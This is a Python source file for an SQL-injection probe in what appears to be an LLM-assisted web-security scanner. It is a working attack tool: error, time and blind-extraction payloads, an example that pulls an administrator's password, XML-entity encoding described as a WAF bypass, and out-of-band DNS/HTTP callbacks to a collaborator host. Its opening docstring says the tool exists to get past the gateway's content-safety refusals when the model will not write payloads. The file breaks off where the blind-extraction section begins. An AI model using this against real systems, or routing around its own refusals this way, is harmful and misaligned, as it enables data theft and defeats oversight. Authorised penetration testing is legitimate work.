"""
sqli_probe tool — deterministic, LLM-free SQL-injection probe (a mini sqlmap).

Confirming a SQL injection is a fixed differential: send a syntax-breaking payload and look for a
DBMS error (or a boolean/time differential), then read back a read-only ``version()`` to prove
impact. None of that needs a language model — so this tool runs the whole thing itself from the
static ``sqli.yaml`` seeds and the existing ``sqli_exploit.extract_db_facts`` engine. That makes
SQLi validation immune to the gateway's content-safety refusals that block the LLM payload
generator: the copilot (or the SQL VulnAgent) can call this directly when the model path won't
produce payloads.

Auth is self-contained (cookies from the proxy jar, same source send_request uses) and every
request is routed through the proxy so each step lands in history, in-scope. Payloads are
detection-only (error/boolean/time ≤ the YAML sleep ceiling) — no stacked writes, no data change.
Supports a plain query/body parameter OR a GraphQL variable (e.g. a string field in a mutation).
"""

from __future__ import annotations

import json
import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qsl, quote, urlencode, urlparse, urlunparse

from dast.agents.sqli_exploit import _ERROR_PARSERS, extract_db_facts
from dast.graphql.variable_fuzzer import _has_graphql_errors, _inject
from dast.payloads.loader import get_payloads, get_signatures, get_value
from dast.tools.base import Tool, register
from dast.tools.context import ToolContext
from dast.utils.logger import get_logger

logger = get_logger(__name__)

_VALID_SEVERITIES = ("critical", "high", "medium", "low", "info")
# "cookie" widens the set for the conditional-responses class of labs where the injectable
# param is a cookie (e.g. TrackingId), not a query/body field. "xml_body" injects into a named
# element of an XML request body (e.g. a POST /product/stock stockCheck document). Existing
# locations are kept in place and order — new entries only append.
_LOCATIONS = ("graphql_var", "query", "body", "cookie", "xml_body")


def _error_re() -> "re.Pattern":
    """Compile the canonical SQL-error signature set from sqli.yaml. The signatures are regex
    fragments (e.g. ``sql syntax.*near``), joined UNescaped — same as sqli_agent._build_error_re."""
    sigs = get_signatures("sqli", "error_signatures") or []
    if not sigs:
        return re.compile(r"(?!x)x")  # matches nothing
    return re.compile("|".join(sigs), re.IGNORECASE)


def _inject_path(body: dict, dotted: str, value: Any) -> dict:
    """Set a (possibly nested) GraphQL variable under ``variables``, e.g. ``v.contentTitle`` ->
    variables["v"]["contentTitle"]. Deep-copies so the template is not mutated across payloads;
    creates intermediate dicts only if missing (normally the captured operation body already
    carries a valid variables.<obj>, so the other required input fields are preserved)."""
    import copy
    injected = copy.deepcopy(body) if isinstance(body, dict) else {}
    variables = injected.get("variables")
    if not isinstance(variables, dict):
        variables = {}
        injected["variables"] = variables
    parts = [p for p in dotted.split(".") if p]
    node = variables
    for key in parts[:-1]:
        nxt = node.get(key)
        if not isinstance(nxt, dict):
            nxt = {}
            node[key] = nxt
        node = nxt
    if parts:
        node[parts[-1]] = value
    return injected


def _path_exists(body: dict, dotted: str) -> bool:
    """True if ``dotted`` (relative to variables, e.g. ``v.contentTitle`` or a plain top-level name)
    resolves to an EXISTING leaf in the operation's variables. A payload injected at a path the op
    does not have goes nowhere and yields a silent false-negative, so the caller validates first."""
    variables = body.get("variables") if isinstance(body, dict) else None
    if not isinstance(variables, dict):
        return False
    node: Any = variables
    for key in [p for p in dotted.split(".") if p]:
        if not isinstance(node, dict) or key not in node:
            return False
        node = node[key]
    return True


def _string_var_paths(body: dict) -> List[str]:
    """Dotted paths (relative to variables) of every STRING-valued leaf in the operation's
    variables — the candidate injection points to suggest when the requested one is absent."""
    out: List[str] = []

    def _descend(node: Any, prefix: str) -> None:
        if isinstance(node, dict):
            for key, val in node.items():
                child = f"{prefix}.{key}" if prefix else key
                if isinstance(val, str):
                    out.append(child)
                elif isinstance(val, dict):
                    _descend(val, child)

    variables = body.get("variables") if isinstance(body, dict) else None
    if isinstance(variables, dict):
        _descend(variables, "")
    return out


# DuckDB error(expr) embeds the expression's value in "Invalid Input Error: <value>" (also
# "Conversion Error: ..."), so a `(SELECT error(version()))` payload leaks version() in the
# GraphQL errors[] message. Parse that out as read-only impact proof.
_DUCKDB_LEAK_RE = re.compile(r"(?:invalid input error|conversion error|binder error)\s*:\s*"
                             r"([^\"'}\n]{1,120})", re.IGNORECASE)
_VERSION_RE = re.compile(r"v?\d+\.\d+(?:\.\d+)?")


def _graphql_error_messages(text: str) -> list:
    import json as _json
    try:
        data = _json.loads(text)
    except Exception:
        return []
    errs = data.get("errors") if isinstance(data, dict) else None
    out = []
    for e in (errs if isinstance(errs, list) else []):
        msg = e.get("message") if isinstance(e, dict) else None
        if isinstance(msg, str):
            out.append(msg)
    return out


def _extract_duckdb_version(text: str) -> Optional[str]:
    """Pull a leaked version()/value out of a DuckDB error surfaced in a GraphQL errors[] message."""
    for msg in _graphql_error_messages(text):
        m = _DUCKDB_LEAK_RE.search(msg)
        if m:
            cand = m.group(1).strip()
            vm = _VERSION_RE.search(cand)
            return vm.group(0) if vm else cand[:80]
    return None


# DuckDB error families — used to detect the backend (DuckDB is not in db_dialect._DB_MARKERS).
_DUCKDB_SIGNATURE_RE = re.compile(
    r"invalid input error|binder error|catalog error|conversion error|parser error|duckdb",
    re.IGNORECASE)


def _detect_dbms(error_text: str) -> str:
    """Best-effort backend from a SQL error. DuckDB first (not covered by db_dialect), else the
    networked dialects via db_dialect.definite_db, else 'unknown'."""
    if _DUCKDB_SIGNATURE_RE.search(error_text or ""):
        return "DuckDB"
    try:
        from dast.agents.db_dialect import definite_db
        return definite_db([error_text or ""]) or "unknown"
    except Exception:
        return "unknown"


def _duckdb_leak_payload(label: str, inner_sql: str) -> str:
    """A read-only DuckDB error-leak payload: break out of the string literal and embed the result
    of ``inner_sql`` (metadata only) after ``label=`` in a DuckDB error message."""
    return f"x', (SELECT error(CONCAT('{label}=', ({inner_sql})))) as v, '"


def _extract_labeled_leak(text: str, label: str) -> Optional[str]:
    """Pull ``<label>=<value>`` out of a DuckDB error surfaced in a GraphQL errors[] message
    (schema/count metadata, never a secret). Returns the value (<= 500 chars) or None."""
    pat = re.compile(re.escape(label) + r"=([^\"'}\n]{0,500})")
    for msg in _graphql_error_messages(text):
        m = pat.search(msg)
        if m:
            return m.group(1).strip()
    return None


_EMBEDDED_DBMS = ("DuckDB", "SQLite")
_NETWORKED_DBMS = ("MySQL", "PostgreSQL", "MSSQL", "Oracle")


def _severity_for(dbms: str, scope_bypass: str) -> "tuple[str, str]":
    """Default finding severity + rationale from the detected DBMS and the scope-bypass verdict.
    Embedded DBs (no RCE/file/write) are confidentiality-only; severity turns on whether the read
    crossed the authorized scope. The operator can still override via the ``severity`` arg."""
    if dbms in _EMBEDDED_DBMS:
        if scope_bypass == "true":
            return "high", (f"{dbms} is embedded (no RCE/file/write) but the injection reads data "
                            "BEYOND the user's authorized scope")
        if scope_bypass == "false":
            return "low", (f"{dbms} is embedded; the injection reads only data already within the "
                           "user's authorized scope")
        return "medium", (f"{dbms} is embedded (no RCE/file/write); read-only SQLi confirmed, scope "
                          "bypass not confirmed")
    if dbms in _NETWORKED_DBMS:
        return "high", (f"networked {dbms}: read-only SQLi confirmed; broader impact "
                        "(stacked writes / file / possible RCE) may be reachable")
    return "medium", "DBMS unknown; read-only SQLi confirmed, impact bounds undetermined"


_SCHEMA: Dict[str, Any] = {
    "type": "object",
    "properties": {
        "url": {"type": "string", "description": "Target URL (must be in scope). For GraphQL, the "
                "graphql endpoint, e.g. https://host/reports/graphql/."},
        "method": {"type": "string", "description": "HTTP method (default POST)."},
        "injection_point": {"type": "string", "description": "Parameter / GraphQL variable to "
                            "inject into, e.g. 'title' or 'id'. For a GraphQL variable NESTED in an "
                            "input object, use a dotted path relative to variables, e.g. "
                            "'v.contentTitle' for variables.v.contentTitle."},
        "injection_location": {"type": "string", "description": "Where the parameter lives: "
                               "'graphql_var' (a GraphQL variable), 'query' (URL query string), "
                               "'body' (JSON/form body), 'cookie' (a named cookie), or 'xml_body' "
                               "(replace the text of a named element in the XML document passed as "
                               "'xml_body'; injection_point is the element name, e.g. 'storeId'). "
                               "Default 'graphql_var'."},
        "body": {"type": "string", "description": "Request body template. For graphql_var a JSON "
                 "{query, variables, operationName}. If omitted for graphql_var, the most recent "
                 "captured operation for this URL is used."},
        "xml_body": {"type": "string", "description": "xml_body location only: the base XML document "
                     "to inject into, e.g. '<?xml version=\"1.0\"?><stockCheck><productId>1"
                     "</productId><storeId>1</storeId></stockCheck>'. injection_point names the "
                     "element whose text content is replaced with the payload. Required when "
                     "injection_location='xml_body'."},
        "content_type": {"type": "string", "description": "Content-Type for the request. Default "
                         "application/json, or 'text/plain; charset=utf-8' for xml_body."},
        "encode": {"type": "string", "enum": ["", "xml_entities"], "description": "Optional payload "
                   "encoding for WAF/filter bypass. '' (default) sends the payload as-is. "
                   "'xml_entities' rewrites every payload character to its XML hex numeric character "
                   "reference (UNION -> &#x55;&#x4e;&#x49;&#x4f;&#x4e;): a WAF string-matching raw "
                   "SQL keywords does not fire, but the server XML-decodes the entities before the "
                   "value reaches the SQL. Pair with injection_location='xml_body'."},
        "record": {"type": "boolean", "description": "Record a finding when CONFIRMED (default true)."},
        "title": {"type": "string", "description": "Finding title (optional; a sensible default is used)."},
        "severity": {"type": "string", "description": "critical|high|medium|low|info. If omitted, "
                     "severity is calibrated from the detected DBMS + scope-bypass verdict."},
        "cwe": {"type": "string", "description": "CWE id (default CWE-89)."},
        "target_table": {"type": "string", "description": "Optional. A table name to quantify impact "
                         "against (DuckDB/graphql_var): leaks its COUNT(*) and column NAMES via "
                         "information_schema (NEVER column values / PII). Used to measure reach."},
        "scope_where": {"type": "string", "description": "Optional SQL predicate describing the "
                        "user's AUTHORIZED subset of target_table (e.g. an account/group filter). "
                        "The probe compares total COUNT(*) vs COUNT(*) WHERE <scope_where> to decide "
                        "whether the read crosses the authorized scope (scope_bypass)."},
        # ── Opt-in deterministic blind / OAST extraction (default '' = the in-band probe above) ──
        "mode": {"type": "string", "description": "Optional. '' (default) runs the normal in-band "
                 "error/time confirmation probe. Set to drive a deterministic extraction the model "
                 "cannot hand-run reliably: 'blind_boolean' (boolean-oracle char-by-char), "
                 "'blind_time' (time-oracle char-by-char), 'error_visible' (one-shot error-message "
                 "leak), or 'oast' (out-of-band DNS/HTTP callback). All modes are opt-in; they do "
                 "not affect the default path."},
        "injection_template": {"type": "string", "description": "Blind/error/oast modes: the value "
                               "injected at injection_point, with a literal '{cond}' placeholder the "
                               "tool substitutes (e.g. \"' AND {cond}-- -\" for a cookie, or "
                               "\"1 AND {cond}\"). For injection_location 'cookie' the template is "
                               "APPENDED to the cookie's ORIGINAL value (suffix semantics): do NOT "
                               "repeat the real cookie value in the template — the tool prepends it, "
                               "sending TrackingId=<orig>' AND {cond}-- -. For blind_time the "
                               "template must ALSO sleep on a "
                               "true condition and carry a '{delay}' placeholder, e.g. "
                               "\"'%3BSELECT CASE WHEN ({cond}) THEN pg_sleep({delay}) ELSE "
                               "pg_sleep(0) END--\"."},
        "extract_sql": {"type": "string", "description": "blind_boolean/blind_time/error_visible: "
                        "the read-only SQL expression to exfiltrate, e.g. \"(SELECT password FROM "
                        "users WHERE username='administrator')\"."},
        "sql_dialect": {"type": "string", "description": "postgres (default) | mysql | mssql | "
                        "oracle — selects the LENGTH/SUBSTRING/ASCII and error-leak syntax for the "
                        "blind/error modes."},
        "true_marker": {"type": "string", "description": "blind_boolean oracle: substring whose "
                        "PRESENCE in the response body means the condition is TRUE."},
        "false_marker": {"type": "string", "description": "blind_boolean oracle: substring whose "
                         "ABSENCE means TRUE (present = FALSE). Use when the app shows a distinct "
                         "'not found' marker."},
        "true_status": {"type": "integer", "description": "blind_boolean oracle: HTTP status code "
                        "that means the condition is TRUE (status-based oracle)."},
        "error_oracle": {"type": "boolean", "description": "blind_boolean oracle: a NEW SQL-error "
                         "signature in the response means the condition is TRUE (conditional-errors "
                         "lab)."},
        "max_length": {"type": "integer", "description": "blind modes: upper bound on the extracted "
                       "string length (default 64) — bounds the request budget."},
        "charset": {"type": "string", "description": "blind modes: allowed characters; the ASCII "
                    "binary search spans min..max of their codes. Default printable ASCII (32-126)."},
        "time_delay": {"type": "number", "description": "blind_time: sleep seconds for a TRUE "
                       "condition (default 3). The {delay} placeholder is filled with this; a scaled "
                       "re-probe confirms the oracle is real, not jitter."},
        "oob_dialect": {"type": "string", "description": "oast: oracle (default) | mssql | mysql — "
                        "selects the OOB egress payload (Oracle EXTRACTVALUE/XMLTYPE XXE DNS, MSSQL xp_dirtree, MySQL "
                        "LOAD_FILE; MySQL egress is frequently blocked)."},
        "wait_seconds": {"type": "integer", "description": "oast: seconds to poll for an OOB "
                         "callback after injecting (default 15)."},
        "oob_host": {"type": "string", "description": "oast: optional operator-supplied OOB host "
                     "(e.g. a Burp Collaborator subdomain). When set, the mode injects a callback "
                     "to THIS host instead of minting an interactsh domain, and does NOT poll (you "
                     "check your own collaborator). Leave empty to use the built-in interactsh + "
                     "auto-poll."},
    },
    "required": ["url", "injection_point"],
}


def _encode_payload(value: str, mode: str) -> str:
    """Transform an injected payload value for WAF / input-filter bypass before it is placed into
    the request. ``mode`` == '' (default) returns the value unchanged — no behavior change anywhere.
    ``mode`` == 'xml_entities' rewrites every character ``c`` to its XML hex numeric character
    reference ``&#x{ord(c):x};``. A WAF that string-matches raw SQL keywords in the body does not
    fire on the encoded form, but the server's XML parser decodes the entities back to the literal
    characters before the value reaches the SQL — so the payload executes while the filter is
    bypassed (the PortSwigger "filter bypass via XML encoding" class)."""
    if mode == "xml_entities":
        return "".join(f"&#x{ord(c):x};" for c in value)
    return value


def _inject_xml_element(xml: str, element: str, value: str) -> Optional[str]:
    """Replace the TEXT CONTENT of the FIRST ``<element>...</element>`` in ``xml`` with ``value``,
    leaving the element tags (and the rest of the document) intact. Returns the new XML string, or
    ``None`` if the element is not present. A function replacement is used so backslashes or
    ``\\1``-style sequences in the payload are inserted literally (str.sub template escaping would
    otherwise corrupt them)."""
    pat = re.compile(rf"(<{re.escape(element)}>)(.*?)(</{re.escape(element)}>)", re.DOTALL)
    if not pat.search(xml):
        return None
    return pat.sub(lambda m: m.group(1) + value + m.group(3), xml, count=1)


async def _resolve_auth(ctx: ToolContext, url: str, method: str) -> Dict[str, Any]:
    """Resolve the SAME auth send_request uses, so the probe can reach a Bearer-authed sub-app
    (e.g. a reports GraphQL endpoint) instead of 403ing with jar cookies alone: jar cookies + the
    sub-app Bearer (from the engine's /spa/session) + a CSRF token from history. Resolved ONCE
    (host/path are constant across payloads); applied per request via auth_provider.attach.
    Never raises."""
    store = getattr(ctx, "store", None)
    parsed = urlparse(url)
    host, path = parsed.hostname or "", parsed.path or "/"
    jar_cookie_map: Dict[str, str] = {}
    if store is not None:
        try:
            jar = store.get_cookies_for_host(host) or []
            jar_cookie_map = {c.get("name"): c.get("value", "") for c in jar if c.get("name")}
        except Exception as exc:
            logger.debug("sqli_probe: cookie jar lookup failed", host=host, error=str(exc))
    rec = None
    session = getattr(ctx, "_session", None)
    try:
        from dast.session.auth_provider import scan_history_bearer
        if session is not None and store is not None and hasattr(session, "_ensure_fresh_bearer"):
            rec = await session._ensure_fresh_bearer(
                store, host, path, browser=getattr(ctx, "browser", None))
        elif store is not None:
            rec = scan_history_bearer(store, host, path)
    except Exception as exc:
        logger.debug("sqli_probe: bearer resolution failed", host=host, error=str(exc))
    csrf_token = None
    if store is not None and method in ("POST", "PUT", "PATCH", "DELETE"):
        try:
            from dast.session.auth_provider import scan_history_csrf
            csrf_token = scan_history_csrf(store, host, exclude_source="copilot")
        except Exception as exc:
            logger.debug("sqli_probe: csrf resolution failed", host=host, error=str(exc))
    return {"cookies": jar_cookie_map or None, "bearer_rec": rec, "csrf_token": csrf_token}


def _resolve_graphql_body(ctx: ToolContext, url: str, given_body: str) -> Optional[dict]:
    """Return the GraphQL request body dict: the caller-supplied one, else the most recent
    captured operation for this URL from history."""
    if given_body.strip():
        try:
            data = json.loads(given_body)
            if isinstance(data, dict) and data.get("query"):
                return data
        except Exception:
            return None
    store = getattr(ctx, "store", None)
    if store is None:
        return None
    try:
        from dast.tools.graphql_fuzz_tools import _captured_operations
        ops = _captured_operations(store, url)
    except Exception as exc:
        logger.warning("sqli_probe: captured-op lookup failed", error=str(exc))
        return None
    if not ops:
        return None
    # ops entries are (op_key, body_dict, auth_headers); take the first.
    return ops[0][1] if isinstance(ops[0][1], dict) else None


def _set_query_param(url: str, param: str, value: str) -> str:
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(parts._replace(query=urlencode(q)))


async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
    url = str(args.get("url", "")).strip()
    point = str(args.get("injection_point", "")).strip()
    location = str(args.get("injection_location", "graphql_var")).strip().lower() or "graphql_var"
    method = str(args.get("method", "POST")).strip().upper() or "POST"
    # xml_body posts a raw XML document — default its Content-Type to text/plain (the lab/WAF path
    # that smuggles SQL via XML entity encoding), while every other location keeps application/json.
    _ct_default = "text/plain; charset=utf-8" if location == "xml_body" else "application/json"
    content_type = str(args.get("content_type", _ct_default)).strip() or _ct_default
    encode = str(args.get("encode", "")).strip().lower()
    xml_body_tmpl = str(args.get("xml_body", ""))
    if not url or not point:
        return {"ok": False, "error": "url and injection_point are required"}
    if location not in _LOCATIONS:
        return {"ok": False, "error": f"injection_location must be one of {_LOCATIONS}"}
    if location == "xml_body":
        if not xml_body_tmpl.strip():
            return {"ok": False, "error": "injection_location 'xml_body' requires an 'xml_body' "
                    "template (the base XML document to inject into)"}
        if not re.search(rf"<{re.escape(point)}>.*?</{re.escape(point)}>", xml_body_tmpl, re.DOTALL):
            return {"ok": False, "error": f"injection_point element '{point}' is not present in the "
                    "xml_body template — expected <{point}>...</{point}>".replace("{point}", point)}
    if not ctx.is_in_scope(url):
        return {"ok": False, "error": "url is out of scope", "url": url}

    gql_body: Optional[dict] = None
    if location == "graphql_var":
        gql_body = _resolve_graphql_body(ctx, url, str(args.get("body", "")))
        if gql_body is None:
            return {"ok": False, "error": "no GraphQL body given and none captured for this URL — "
                    "pass 'body' as {query, variables, operationName} JSON"}
        # Guard against a silent false-negative: if the injection_point does not exist in THIS
        # operation's variables, a payload injected there goes nowhere and the probe would report a
        # misleading NOT CONFIRMED. Fail loudly instead, naming the operation and its string fields,
        # so the caller targets a real field (or captures the right operation).
        if not _path_exists(gql_body, point):
            candidates = _string_var_paths(gql_body)
            op_name = gql_body.get("operationName") if isinstance(gql_body, dict) else None
            return {"ok": False, "error": f"injection_point '{point}' is not a variable of the "
                    f"captured operation{f' {op_name!r}' if op_name else ''} — probing it would be "
                    "a false negative. Target one of this operation's string variables, or capture "
                    "the operation that actually carries the field.",
                    "operation": op_name, "available_string_fields": candidates}

    source_label = getattr(ctx, "source_label", None)
    # Resolve cookies + sub-app Bearer + CSRF once (same machinery as send_request), applied to
    # each request via attach so a Bearer-authed sub-app (e.g. /reports/graphql) is reachable.
    from dast.session.auth_provider import attach as _attach
    auth = await _resolve_auth(ctx, url, method)

    def _headers() -> Dict[str, str]:
        # X-Requested-With explicitly: some SPA sub-apps require it even when auth is a Bearer with
        # no CSRF (attach only sets it alongside a CSRF token).
        h: Dict[str, str] = {"content-type": content_type, "X-Requested-With": "XMLHttpRequest"}
        if source_label:
            h["x-dast-source"] = str(source_label)
        _attach(h, transport="api", cookies=auth["cookies"], bearer_rec=auth["bearer_rec"],
                csrf_token=auth["csrf_token"], drop_all_authorization=True)
        return h

    import httpx

    time_threshold_ms = float(get_value("sqli", "time_threshold_ms", 4500) or 4500)

    async def _send_value(client: "httpx.AsyncClient", value: str) -> Optional["httpx.Response"]:
        """Inject ``value`` at the chosen point and send through the proxy. Returns the response."""
        try:
            # Optional payload encoding (WAF/input-filter bypass) — applied to the injected value
            # for ANY location; default encode="" is a no-op, so existing behavior is unchanged.
            value = _encode_payload(value, encode)
            if location == "xml_body":
                # Replace the text content of the named XML element with the (optionally encoded)
                # payload and POST the raw document. Presence of both xml_body and the element was
                # validated up front; a None here (element vanished) is a defensive no-send.
                body = _inject_xml_element(xml_body_tmpl, point, value)
                if body is None:
                    logger.debug("sqli_probe: xml element not found at send", element=point)
                    return None
                return await client.request(method, url, headers=_headers(),
                                            content=body.encode("utf-8"))
            if location == "graphql_var":
                # Dotted injection_point (e.g. v.contentTitle) targets a NESTED input field; a
                # plain name is a top-level variable (reuse the shared helper).
                injected = (_inject_path(gql_body, point, value) if "." in point
                            else _inject(gql_body, point, value))
                return await client.request(method, url, headers=_headers(),
                                            content=json.dumps(injected).encode("utf-8"))
            if location == "query":
                return await client.request(method, _set_query_param(url, point, value),
                                            headers=_headers())
            if location == "cookie":
                # Inject into a named cookie (injection_point names the cookie, e.g. TrackingId),
                # merging with the jar cookies attach() already placed in the Cookie header so the
                # session cookie survives. SUFFIX semantics: the injected value is APPENDED to the
                # cookie's ORIGINAL value, so the sent cookie is `{point}={original}{value}` — for
                # the conditional-responses class of blind SQLi the payload is a suffix that must
                # follow the real value (TrackingId=<orig>' AND {cond}-- - -> WHERE
                # trackingId='<orig>' AND {cond}--). Replacing the whole cookie with just the
                # payload would send trackingId='' AND ... -> zero rows for BOTH branches, so the
                # boolean oracle could never distinguish. If the targeted cookie is not present in
                # the jar, fall back to `{point}={value}`. Only the cookie branch changes; the
                # graphql_var/query/body branches legitimately REPLACE and are untouched.
                h = _headers()
                existing = ""
                for key in list(h.keys()):
                    if key.lower() == "cookie":
                        existing = h.pop(key)
                orig = ""
                kept: List[str] = []
                for p in (existing.split("; ") if existing else []):
                    if not p:
                        continue
                    if p.split("=", 1)[0].strip() == point:
                        orig = p.split("=", 1)[1] if "=" in p else ""
                    else:
                        kept.append(p)
                # URL-encode the injected cookie value so HTTP-illegal cookie-octet characters
                # (spaces, <, >, ", %, ;, =, ? — e.g. an Oracle XXE/OAST xmltype payload) survive
                # transport: a raw payload makes the server reject the malformed cookie with HTTP
                # 500 and the SQL never executes. The server URL-decodes the cookie value back to
                # the exact raw `value`, so `%`->`%25`, space->`%20`, `'`->`%27` all round-trip.
                # Only the targeted value is encoded; the kept cookies and the `{point}=` name are
                # left intact. `orig` is alphanumeric, so encoding is a no-op on the prepend.
                kept.append(f"{point}={quote(f'{orig}{value}', safe='')}")
                h["Cookie"] = "; ".join(kept)
                return await client.request(method, url, headers=h)
            # body: JSON object field
            body_obj = {point: value}
            return await client.request(method, url, headers=_headers(),
                                        content=json.dumps(body_obj).encode("utf-8"))
        except Exception as exc:
            logger.debug("sqli_probe: send failed", error=str(exc)[:160])
            return None

    err_re = _error_re()

    # Opt-in deterministic blind / OAST extraction modes. The DEFAULT mode "" skips this
    # branch entirely and runs the exact in-band error/time probe below, byte-for-byte
    # unchanged. Everything a mode needs (auth, _send_value, scope/path validation) is already
    # resolved above, so modes reuse it read-only.
    mode = str(args.get("mode", "")).strip().lower()
    if mode:
        return await _run_mode(mode, ctx, args, _send_value, err_re,
                               location=location, point=point, url=url, method=method)

    steps: List[Dict[str, Any]] = []
    confirmed = False
    technique = ""
    confirming_payload = ""
    evidence_snippet = ""

    try:
        async with httpx.AsyncClient(proxy=ctx.proxy_url, verify=False,
                                     follow_redirects=False, timeout=30) as client:
            # Baseline (benign value) — to tell a NEW sql error / graphql error from a pre-existing one.
            base = await _send_value(client, "sqli_probe_baseline")
            base_text = base.text if base is not None else ""
            base_sql_err = bool(err_re.search(base_text))
            base_gql_err = _has_graphql_errors(base_text)
            steps.append({"label": "baseline", "status": getattr(base, "status_code", None),
                          "sql_error": base_sql_err, "graphql_error": base_gql_err})

            # Error-based: a syntax-breaking payload that yields a NEW SQL error is the strong signal.
            for payload in get_payloads("sqli", "error_based"):
                resp = await _send_value(client, payload)
                if resp is None:
                    continue
                text = resp.text
                new_sql_err = bool(err_re.search(text)) and not base_sql_err
                new_gql_err = _has_graphql_errors(text) and not base_gql_err
                if new_sql_err or new_gql_err:
                    confirmed = True
                    technique = "error-based"
                    confirming_payload = payload
                    m = err_re.search(text)
                    evidence_snippet = (m.group(0) if m else text)[:300]
                    steps.append({"label": "error-based hit", "payload": payload,
                                  "status": resp.status_code,
                                  "sql_error": new_sql_err, "graphql_error": new_gql_err,
                                  "snippet": evidence_snippet})
                    break
                steps.append({"label": "error-based miss", "payload": payload,
                              "status": resp.status_code})

            # Time-based fallback only if error-based did not confirm.
            if not confirmed:
                for payload in get_payloads("sqli", "time_based"):
                    t0 = time.monotonic()
                    resp = await _send_value(client, payload)
                    elapsed_ms = (time.monotonic() - t0) * 1000.0
                    if resp is None:
                        continue
                    if elapsed_ms >= time_threshold_ms:
                        confirmed = True
                        technique = "time-based"
                        confirming_payload = payload
                        evidence_snippet = f"response delayed {elapsed_ms:.0f}ms (>= {time_threshold_ms:.0f}ms)"
                        steps.append({"label": "time-based hit", "payload": payload,
                                      "elapsed_ms": round(elapsed_ms), "status": resp.status_code})
                        break
                    steps.append({"label": "time-based miss", "payload": payload,
                                  "elapsed_ms": round(elapsed_ms)})

            # Impact proof: best-effort read-only version()/db/user extraction (error-based only).
            facts: Dict[str, str] = {}
            proof_summary = ""
            dbms = "unknown"
            scope_bypass = "unknown"
            if confirmed and technique == "error-based":
                async def _send(value: str) -> Optional["httpx.Response"]:
                    return await _send_value(client, value)
                try:
                    proof = await extract_db_facts(_send, confirming_payload, dbms_hints=None)
                except Exception as exc:
                    proof = None
                    logger.debug("sqli_probe: extraction failed", error=str(exc)[:160])
                if proof is not None:
                    facts = dict(proof.facts)
                    proof_summary = proof.summary()
                    steps.append({"label": "impact proof", "technique": proof.technique,
                                  "dbms": proof.dbms, "facts": facts})
                # DuckDB version-leak oracle (GraphQL errors[]): extract_db_facts does not cover
                # DuckDB, so when nothing was extracted, try the read-only error(version()) leak and
                # parse the version from the GraphQL error message. Best-effort; keeps CONFIRMED.
                if not facts and location == "graphql_var":
                    for payload in get_payloads("sqli", "duckdb_version"):
                        resp = await _send_value(client, payload)
                        if resp is None:
                            continue
                        ver = _extract_duckdb_version(resp.text)
                        if ver:
                            facts = {"version": ver}
                            technique = "error-based (DuckDB version leak)"
                            proof_summary = f"DuckDB version()={ver} leaked via error()"
                            steps.append({"label": "duckdb version leak", "payload": payload,
                                          "version": ver})
                            break

                # DBMS from the confirming error (DuckDB isn't in db_dialect, so detect it here).
                dbms = _detect_dbms(evidence_snippet)

                # Deterministic impact facts + scope-bypass differential (DuckDB/graphql_var only).
                # All reads are schema/count metadata via the read-only error(CONCAT(...)) leak —
                # NEVER column values / PII. Bounded to a few extra requests, only when meaningful.
                if dbms == "DuckDB" and location == "graphql_var":
                    fact_sql: Dict[str, str] = get_value("sqli", "duckdb_fact_sql", {}) or {}

                    async def _leak(label: str, inner_sql: str) -> Optional[str]:
                        if not inner_sql:
                            return None
                        resp = await _send_value(client, _duckdb_leak_payload(label, inner_sql))
                        return _extract_labeled_leak(resp.text, label) if resp is not None else None

                    tables = await _leak("TBLS", fact_sql.get("tables", ""))
                    if tables:
                        facts["reachable_tables"] = tables
                        steps.append({"label": "reachable tables", "value": tables})

                    target = str(args.get("target_table", "")).strip()
                    if target:
                        rc = await _leak("RC", fact_sql.get("row_count", "").format(table=target))
                        cols = await _leak("COLS", fact_sql.get("columns", "").format(table=target))
                        if rc:
                            facts["row_count"] = rc
                        if cols:
                            facts["columns"] = cols
                        steps.append({"label": "target-table facts", "table": target,
                                      "row_count": rc, "columns": cols})

                        where = str(args.get("scope_where", "")).strip()
                        if where and rc:
                            srec = fact_sql.get("scoped_count", "")
                            try:
                                scoped_sql = srec.format(table=target, where=where)
                            except (KeyError, IndexError):
                                scoped_sql = ""
                            scoped = await _leak("SRC", scoped_sql)
                            if scoped:
                                try:
                                    scope_bypass = "true" if int(scoped) < int(rc) else "false"
                                except ValueError:
                                    scope_bypass = "unknown"
                                facts["scoped_row_count"] = scoped
                                steps.append({"label": "scope differential", "total": rc,
                                              "scoped": scoped, "scope_bypass": scope_bypass})
    except Exception as exc:
        return {"ok": False, "error": f"probe failed: {str(exc)[:200]}", "steps": steps}

    if confirmed:
        verdict = (f"CONFIRMED — {technique} SQL injection in '{point}' ({location}). "
                   f"Payload {confirming_payload!r} produced: {evidence_snippet}."
                   + (f" Read-only proof: {proof_summary}." if proof_summary else ""))
    else:
        verdict = (f"NOT CONFIRMED — no SQL error differential or timing delay for '{point}' "
                   f"({location}).")

    # Calibrate the default severity from DBMS + scope; the operator can still override via `severity`.
    computed_sev, sev_rationale = _severity_for(dbms, scope_bypass)
    sev_arg = str(args.get("severity", "")).strip().lower()
    severity = sev_arg if sev_arg in _VALID_SEVERITIES else computed_sev

    result: Dict[str, Any] = {"ok": True, "confirmed": confirmed, "verdict": verdict,
                              "technique": technique, "facts": facts if confirmed else {},
                              "dbms": dbms, "scope_bypass": scope_bypass,
                              "severity": severity if confirmed else None,
                              "severity_rationale": sev_rationale if confirmed else None,
                              "steps": steps}

    if confirmed and bool(args.get("record", True)) and getattr(ctx, "store", None) is not None:
        evidence = verdict + f" [backend={dbms}; scope_bypass={scope_bypass}; {sev_rationale}]"
        finding = {
            "title": str(args.get("title", "")).strip()
            or f"SQL injection in '{point}' ({technique})",
            "severity": severity,
            "attack_type": "sqli",
            "cwe": str(args.get("cwe", "CWE-89")).strip() or "CWE-89",
            "parameter": point,
            "evidence": evidence,
            "dbms": dbms,
            "scope_bypass": scope_bypass,
            "steps": steps,
            "extracted_data": facts,
            "confirmed": True,
            "confidence": 1.0,
            "validated_by": ["sqli_probe"],
            "source": "copilot",
        }
        try:
            entry_id = ctx.store.record_manual_finding(finding, url, method)
            result["recorded_entry_id"] = entry_id
            logger.info("sqli_probe recorded finding", entry_id=entry_id, severity=severity,
                        technique=technique)
        except Exception as exc:
            result["record_error"] = str(exc)[:200]

    return result


# ── Opt-in deterministic blind / OAST extraction modes ───────────────────────────────────────
# These never run on the default path (mode == ""). Each drives a deterministic exfil the model
# cannot hand-run reliably within a turn's tool-call budget: a boolean/time oracle char-by-char
